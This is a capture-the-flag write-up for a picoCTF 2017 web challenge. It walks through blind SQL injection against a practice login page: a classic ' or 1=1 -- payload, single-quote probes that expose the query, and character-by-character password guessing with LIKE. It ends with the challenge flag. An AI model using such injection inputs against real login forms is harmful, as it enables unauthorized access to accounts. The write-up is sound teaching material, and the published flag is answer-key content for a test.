**Points:** 125  
**Description:**

>The [website](http://shell2017.picoctf.com:33838/) isn't really me much, but you can still get the admin password, right?  

**Hint:**

>Sometimes an error message can be just as useful.  

## Solution

This is a blind SQL injection. First let's try:  
    login: admin  
    password: ' or 1=1 --  

This gives us the following error:  
    `Login Functionality Not Complete. Flag is 63 characters`  

Let's try another request:  
    login: '  
    password: a  
    output: `select * from users where user = ''';`

Another:
    login: admin
    password: '
    output: `select * from users where pass = ''';`

This gives us more information about how the website request works:  
    search for username in table -> if it exists, search for corresponding password  

Since we know that the flag is 63 characters long, we will have to use the SQL `LIKE` operator, which will allow us to guess the admin's password char by char.  
Here's the python code used [pwdguess.py](pwdguess.py), which gives us:  
    Total requests: 2134  
    The flag is: not_All_errors_should_be_shown_07fA15beAe68Af0694171000114ec419%  

So the flag is: `not_All_errors_should_be_shown_07fA15beAe68Af0694171000114ec419%`
